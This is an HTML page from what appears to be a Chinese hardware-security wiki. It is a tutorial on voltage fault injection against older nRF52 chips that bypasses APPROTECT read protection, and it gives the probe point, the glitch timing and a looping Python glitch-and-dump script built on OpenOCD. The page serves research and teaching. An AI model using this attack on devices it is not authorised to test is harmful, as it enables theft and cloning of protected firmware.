@@ -1,0 +1,1085 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="yichen">
+      
+      
+        <link rel="canonical" href="https://yichen115.github.io/%E6%95%85%E9%9A%9C%E6%A1%88%E4%BE%8B/nRF52%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20APPROTECT%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/">
+      
+      
+        <link rel="prev" href="../STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.50">
+    
+    
+      
+        <title>nRF52 电压故障注入绕过 APPROTECT 固件读保护 - 故障注入wiki 测试</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.a40c8224.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="故障注入wiki 测试" class="md-header__button md-logo" aria-label="故障注入wiki 测试" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            故障注入wiki 测试
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              nRF52 电压故障注入绕过 APPROTECT 固件读保护
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" class="md-tabs__link">
+          
+  
+    
+  
+  上手指南
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/" class="md-tabs__link">
+          
+  
+    
+  
+  故障案例
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="故障注入wiki 测试" class="md-nav__button md-logo" aria-label="故障注入wiki 测试" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    故障注入wiki 测试
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    上手指南
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            上手指南
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/PowerShorter%E5%BC%80%E7%AE%B1%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PowerShorter开箱与简单使用
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    故障案例
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            故障案例
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../STM32F1x%20%E7%94%B5%E5%8E%8B%E6%95%85%E9%9A%9C%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%20RDP1%20%E5%9B%BA%E4%BB%B6%E8%AF%BB%E4%BF%9D%E6%8A%A4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    STM32F1x 电压故障注入绕过 RDP1 固件读保护
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    nRF52 电压故障注入绕过 APPROTECT 固件读保护
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    nRF52 电压故障注入绕过 APPROTECT 固件读保护
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      相关工具及环境
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="相关工具及环境">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      推荐硬件设备清单
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      软件清单
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#approtect" class="md-nav__link">
+    <span class="md-ellipsis">
+      APPROTECT 介绍与开启
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="APPROTECT 介绍与开启">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      开启保护方法
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      解除保护方法
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#approtect_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      APPROTECT 介绍
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nrf52" class="md-nav__link">
+    <span class="md-ellipsis">
+      nRF52 芯片版本确认
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#approtect_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      故障注入绕过 APPROTECT 读保护
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="故障注入绕过 APPROTECT 读保护">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cpu" class="md-nav__link">
+    <span class="md-ellipsis">
+      电压毛刺注入物理位置：CPU 核心供电
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      电压毛刺注入时间位置
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      故障注入时遇到的问题
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      硬件接线参考
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      成功波形参考
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      攻击脚本参考
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      相关工具及环境
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="相关工具及环境">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      推荐硬件设备清单
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      软件清单
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#approtect" class="md-nav__link">
+    <span class="md-ellipsis">
+      APPROTECT 介绍与开启
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="APPROTECT 介绍与开启">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      开启保护方法
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      解除保护方法
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#approtect_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      APPROTECT 介绍
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nrf52" class="md-nav__link">
+    <span class="md-ellipsis">
+      nRF52 芯片版本确认
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#approtect_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      故障注入绕过 APPROTECT 读保护
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="故障注入绕过 APPROTECT 读保护">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cpu" class="md-nav__link">
+    <span class="md-ellipsis">
+      电压毛刺注入物理位置：CPU 核心供电
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      电压毛刺注入时间位置
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      故障注入时遇到的问题
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      硬件接线参考
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      成功波形参考
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      攻击脚本参考
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  <h1>nRF52 电压故障注入绕过 APPROTECT 固件读保护</h1>
+
+<h2 id="_1">相关工具及环境</h2>
+<h3 id="_2">推荐硬件设备清单</h3>
+<ul>
+<li>nRF52840 QIAAD0 开发板（USB Dongle）</li>
+<li>Pico 示波器</li>
+<li>PowerShorter 电压短路故障注入设备</li>
+<li>FlexHolder 柔性探针台</li>
+<li>Jlink 调试器</li>
+<li>杜邦线若干</li>
+</ul>
+<h3 id="_3">软件清单</h3>
+<ul>
+<li><a href="https://www.segger.com/downloads/jlink/">Jlink 软件及驱动</a></li>
+<li><a href="https://www.nordicsemi.com/Products/Development-tools/nRF-Command-Line-Tools">nRF-Command-Line-Tools</a></li>
+<li><a href="https://github.com/xpack-dev-tools/openocd-xpack/releases">openocd</a></li>
+<li><a href="https://www.picotech.com/downloads">Pico 示波器软件</a></li>
+<li><a href="https://zadig.akeo.ie/">zadig</a></li>
+</ul>
+<hr />
+<h2 id="approtect">APPROTECT 介绍与开启</h2>
+<p>nRF52 系列芯片为保护开发者固件不被非法读取，提供了 APPRTOECT 固件读保护机制，开启读保护后无法使用 SWD 接口读取芯片内的固件</p>
+<h3 id="_4">开启保护方法</h3>
+<p>先使用 Jlink 连接 目标 SWD 接口</p>
+<table>
+<thead>
+<tr>
+<th>USB Dongle</th>
+<th><strong>Jlink</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>VDD</td>
+<td>VT/VREF</td>
+</tr>
+<tr>
+<td>GND</td>
+<td>GND</td>
+</tr>
+<tr>
+<td>SWCLK</td>
+<td>TCK/SWCLK</td>
+</tr>
+<tr>
+<td>SWDIO</td>
+<td>TMS/SWDIO</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="image-20241210113020427" src="../img/image-20241210113020427.png" /></p>
+<p>使用官方命令行工具（nRF-Command-Line-Tools）执行如下命令，对开发板重新上电复位后生效：</p>
+<pre><code>nrfjprog -f nRF52 --memwr 0x10001208 --val 0xFFFFFF00
+</code></pre>
+<p>再次连接芯片已无法查看 Flash</p>
+<p><img alt="image-20241210105012402" src="../img/image-20241210105012402.png" /></p>
+<h3 id="_5">解除保护方法</h3>
+<p>不管是 Jflash 还是官方命令行工具都提供解除保护的功能（<strong>代价是清除芯片内固件</strong>，以达到保护固件不被非法读取的目的）</p>
+<p>JFlash 软件在探测到保护开启时直接点击 Yes 即可解除保护，<strong>此过程会同时清除固件</strong></p>
+<p><img alt="image-20241210105116600" src="../img/image-20241210105116600.png" /></p>
+<p>官方命令行工具提供 <code>nrfjprog -f NRF52 --recover</code> 命令解除保护，<strong>此过程会同时清除固件</strong></p>
+<h3 id="approtect_1">APPROTECT 介绍</h3>
+<p>通过阅读<a href="https://docs.nordicsemi.com/bundle/nRF52840_PS_v1.2/resource/nRF52840_PS_v1.2.pdf">芯片手册第 42 页</a>可以得知：APPROTECT 寄存器位于 0x10001208 默认值 0xFF 表示关闭保护，若写为 0x00 则表示开启保护，因此官方工具开启保护实际是将该寄存器写为了 0x00</p>
+<p>芯片上电后会读取该寄存器的值，若为 0x00 则配置保护机制，不允许通过 SWD 接口访问芯片内固件，因此我们可以在芯片上电时对其进行故障注入，绕过该配置流程，使得调试接口保持开启状态</p>
+<h3 id="nrf52">nRF52 芯片版本确认</h3>
+<p>鉴于 nRF52 新版本芯片已经对故障注入添加了缓解措施，无法简单地通过故障注入绕过读保护了，复现的时候需要使用老版本的 nRF52 芯片。同时因为很多芯片丝印与芯片手册无法对应，因此这里提供一个方法，简单判断芯片是否为新版本：</p>
+<p>首先按照前文所说 SWD 接线方式接线，使用 <code>nrfjprog -f NRF52 --recover</code> 命令解除保护，然后拔插重新上电，使用如下命令读取 APPROTECT 寄存器的值，若全为 FF 则是老版本芯片，若为 5A 则是新版本芯片</p>
+<pre><code>nrfjprog -f nRF52 --memrd 0x10001208
+</code></pre>
+<hr />
+<h2 id="approtect_2">故障注入绕过 APPROTECT 读保护</h2>
+<h3 id="cpu">电压毛刺注入物理位置：CPU 核心供电</h3>
+<p>电压故障注入攻击点位于芯片附近的一颗小电容的右侧，该点连接到芯片 DEC1 引脚（电容左侧通过万用表可测得为 GND）</p>
+<p><img alt="image-20241210105935824" src="../img/image-20241210105935824.png" /></p>
+<h3 id="_6">电压毛刺注入时间位置</h3>
+<p>使用示波器以 DEC1 上升沿作为触发，观察 DEC1 处电压波形，可以看到存在一个小的电压下降沿，压降大约 100~200mv，毛刺就打在这个小下降沿附近</p>
+<p><img alt="image-20241210110057903" src="../img/image-20241210110057903.png" /></p>
+<h3 id="_7">故障注入时遇到的问题</h3>
+<p>1、如何控制设备重启</p>
+<p>​   答：通过 PowerShorter 设备的 GPIO 为 Dongle 供电，Python 代码控制 GPIO</p>
+<p>2、打哪个地方的电压、如何打</p>
+<p>​   答：打 DEC1；短接 DEC1 和 GND 使其电压短暂拉低</p>
+<p>3、什么时候打故障</p>
+<p>​   答：以 GPIO 供电上升沿作为触发，设置延时，故障打在 DEC1 下降沿附近</p>
+<p>4、怎么判断是否打成功了</p>
+<p>​   答：openocd 连接 SWD 读取固件，dump 成功则故障注入成功（注：Openocd 调用 jlink 需要使用 zadig 软件安装 winusb 驱动）</p>
+<p><strong>配合 Flex Holder 柔性探针台可以免去焊接，直接将小电容右侧的 DEC1 引脚引出</strong></p>
+<p><img alt="image-20241210110621643" src="../img/image-20241210110621643.png" /></p>
+<p><img alt="image-20241210110628584" src="../img/image-20241210110628584.png" /></p>
+<h3 id="_8">硬件接线参考</h3>
+<p><img alt="image-20241210113346327" src="../img/image-20241210113346327.png" /></p>
+<h3 id="_9">成功波形参考</h3>
+<p>A 通道(蓝色波形)为供电电压；B 通道(红色波形)为 DEC1 电压</p>
+<p>DEC1 的下降沿位置恰好被故障毛刺命中，不再表现为下降沿，但并不是没有下降沿就为成功</p>
+<p><img alt="image-20241210110739940" src="../img/image-20241210110739940.png" /></p>
+<h3 id="_10">攻击脚本参考</h3>
+<p><strong>推荐使用 Jupyter Lab 进行实验</strong></p>
+<p>导入 Python 库</p>
+<pre><code class="language-python">from power_shorter import *
+import time, os, random, subprocess
+import serial
+import faultviz
+</code></pre>
+<p>初始化设备</p>
+<pre><code class="language-python">ps_dev = PowerShorter('com55')
+</code></pre>
+<p>测试设备上下电</p>
+<pre><code class="language-python">ps_dev.gpio(GPIO.GPIO1, 0)
+time.sleep(1)
+ps_dev.gpio(GPIO.GPIO1, 1)
+</code></pre>
+<p>初始化 faultviz 服务与表单</p>
+<pre><code class="language-python">faultviz.start_view_service(port=12345) 
+vt = faultviz.ViewWidget()
+</code></pre>
+<p>定义攻击函数</p>
+<pre><code class="language-python">def nrf52_attack():
+    ps_dev.gpio(GPIO.GPIO1, 0)
+    time.sleep(1)
+    glitch_delay = random.randint(158500, 158700) # 设置毛刺延迟范围
+    glitch_pulse = random.randint(100, 300)       # 设置毛刺宽度范围
+    ps_dev.engine_cfg(Engine.E1, [(0, glitch_delay), (1, glitch_pulse), (0, 1)], TRIGGER_MODE.RISE)    # 设置毛刺延时及宽度
+    ps_dev.arm(Engine.E1)        # 激活毛刺
+    ps_dev.gpio(GPIO.GPIO1, 1)   # 设备上电
+    time.sleep(0.5)              # 延迟一段时间 等待攻击完成
+    s = ps_dev.state(Engine.E1)  # 检查毛刺状态
+    if s == &quot;glitched&quot;:
+        res, result = subprocess.getstatusoutput('openocd -f interface/jlink.cfg -c &quot;transport select swd&quot; -f target/nrf52.cfg -c &quot;init;dump_image nrf_flash.bin 0x0 0x10000;exit&quot;')  # 通过 OpenOCD dump 固件，若成功则表示已绕过 APPROTECT
+        if &quot;Could not find MEM-AP to control the core&quot; in result:
+            status = &quot;Normal&quot;
+        elif &quot;No J-Link device found&quot; in result:
+            status = &quot;No Jlink&quot;
+        elif res == 0:
+            status = &quot;Success&quot;
+        else:
+            status = &quot;Unknown&quot;
+        vt.update(state = status, delay = glitch_delay, pulse = glitch_pulse, result = result, res = res)  # 更新故障结果到表单
+        return res
+    else:
+        print(&quot;no trigger&quot;)
+</code></pre>
+<p>执行一次攻击函数，检查代码是否有问题</p>
+<pre><code class="language-python">nrf52_attack()
+</code></pre>
+<p>查看表单，检查刚才的攻击是否将结果添加到表单中</p>
+<pre><code class="language-python">vt.show()
+</code></pre>
+<p>写个循环，直到成功绕过 APPROTECT 才停止攻击，循环过程中故障参数及结果会不断添加到 vt 表单中，配合示波器调整参数，优化毛刺位置</p>
+<pre><code class="language-python">doAttack = 1
+while(doAttack):
+    doAttack = nrf52_attack()
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
